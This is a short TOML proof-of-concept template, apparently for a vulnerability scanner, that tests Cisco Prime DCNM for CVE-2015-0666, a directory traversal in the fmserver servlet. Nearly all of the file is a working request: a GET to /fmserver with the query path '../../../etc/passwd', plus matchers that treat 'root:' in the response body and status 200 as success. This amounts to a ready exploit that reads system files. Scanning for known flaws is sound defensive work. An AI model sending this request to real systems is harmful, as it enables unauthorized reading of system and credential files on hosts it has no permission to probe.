[info]
author = "ave"
description = "验证 Cisco Prime DCNM fmserver servlet 目录遍历漏洞，可读取任意文件"
id = "POC-AVE-2015-0099"
name = "CVE-2015-0666 PoC"
severity = "high"
tags = ["ave-2015-0099"]
vuln_id = [
    "CVE-2015-0666",
    "AVE-2015-0099",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/fmserver"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[poc.requests.query]
path = "../../../etc/passwd"
